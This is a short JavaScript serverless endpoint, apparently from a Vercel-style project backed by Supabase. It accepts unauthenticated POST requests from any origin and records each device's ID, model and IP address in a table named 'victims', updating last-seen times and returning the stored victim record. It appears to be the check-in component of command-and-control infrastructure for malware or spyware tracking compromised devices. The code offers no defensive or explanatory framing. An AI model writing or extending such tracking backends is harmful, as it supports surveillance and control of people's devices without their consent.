
import { supabase } from './_lib/supabase.js';

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
    
    const { device_id, device_model, ip } = req.body;
    
    const { data, error } = await supabase
        .from('victims')
        .upsert({ 
            device_id, 
            device_model, 
            ip, 
            last_seen: new Date().toISOString(),
            first_seen: new Date().toISOString()
        }, { onConflict: 'device_id' })
        .select();
    
    if (error) return res.status(500).json({ error: error.message });
    res.json({ status: 'ok', victim: data[0] });
}
